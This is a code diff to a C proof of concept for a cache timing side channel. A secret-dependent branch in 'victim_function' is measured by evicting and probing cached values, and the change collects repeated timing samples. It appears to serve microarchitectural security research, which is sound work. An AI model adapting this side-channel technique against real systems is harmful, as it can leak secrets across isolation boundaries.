@@ -15,11 +15,11 @@
 #define SIZE 256
 #define STRIDE 512
 
-int leakValue();
+void leakValue();
+uint64_t time1, time2;
 
-
-uint64_t val __attribute__((aligned(2048))) = 0xbeefbeef;
-uint64_t val2 __attribute__((aligned(2048))) = 0x1234567;
+uint64_t val __attribute__((aligned(2*2048))) = 0xbeefbeef;
+uint64_t val2 __attribute__((aligned(2*2048))) = 0x1234567;
 static uint8_t array[SIZE * STRIDE] __attribute__((aligned(2048)));
 
 cache_ctx_t val_context __attribute__((aligned(2048)));
@@ -28,25 +28,24 @@ cache_ctx_t secret_context __attribute__((aligned(2048)));
 cache_ctx_t is_public_context __attribute__((aligned(2048)));
 cache_ctx_t arr_context __attribute__((aligned(2048)));
 
+uint64_t tmp2, tmp3;
 
-int is_public  __attribute__((aligned(2048))) = 0x00000001;
+
 int secret __attribute__((aligned(2048)))= 0xdeadbabe ;
 
 //32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25
 
-void victim_function(register int secret_val, int isPublic)
+int __attribute__((noinline, used)) victim_function(register int secret_val, int isPublic)
 {
     if (isPublic < array[0x2 * STRIDE]) {
         if(secret == 0) {
-          double tmp2;
           memcpy((void*)&tmp2, (void *)&val, sizeof(tmp2));
         }
         else {
-          double tmp3; 
           memcpy((void*)&tmp3, (void *)&val2, sizeof(tmp3));
         }
   }
-  return ;
+  return 0;
 }
 
 
@@ -61,13 +60,12 @@ void setup() {
     arr_context = cache_remove_prepare(&array[0x2 * STRIDE]);
     val_context = cache_remove_prepare(&val);
     val2_context = cache_remove_prepare(&val2);
-    is_public_context = cache_remove_prepare(&is_public);
     secret_context = cache_remove_prepare(&secret);
     return;
 }
 
 
-int leakValue() {
+void leakValue() {
 
     int num_hits = 0 ;
 
@@ -88,7 +86,6 @@ int leakValue() {
         cache_remove(arr_context);
         cache_remove(val_context);
         cache_remove(val2_context);
-        cache_remove(is_public_context);
         //cache_remove(secret_context);
 
         //make sure everything is removed from cache
@@ -114,15 +111,12 @@ int leakValue() {
 
     // measure time
     //memory_access(&global_variable);
-    time = probe(&val);
+    time1 = probe(&val);
+    time2 = probe(&val2);
 
-    //assert(time != 0);
-    num_hits += (time); // && time makes sure the time wasn't 0 (0 = the timer is not running)
-    
-    
     // return offset of array2 with most cache hits 
     // (should be the value read from out-of-bound access to array1 during mis-speculation)
-    return num_hits;
+    return ;
 }
 
 
@@ -135,7 +129,8 @@ int main(int argc, char *argv[])
     secret = atoi(argv[1]);
     int guess = 0;
     
-    uint64_t result;
+    uint64_t result[32];
+    uint64_t result2[32];
     
     memory_fence();
     
@@ -145,11 +140,22 @@ int main(int argc, char *argv[])
     setup();
     memory_fence();
     
-    
-    result = leakValue();
-    printf("%3lld ", result);
+    for(int i = 0; i < 32; i++){
+        leakValue();
+        result[i] = time1;
+        result2[i] = time2;
+    }
+    for(int i = 0; i < 32; i++){
+    printf("%3lld ", result[i]);
+    }
+    printf("\n");
+    for(int i = 0; i < 32; i++){
+    printf("%3lld ", result2[i]);
+    }
     
     timer_stop();
+
+  printf("%d, %d", tmp2, tmp3);
 
 }
 
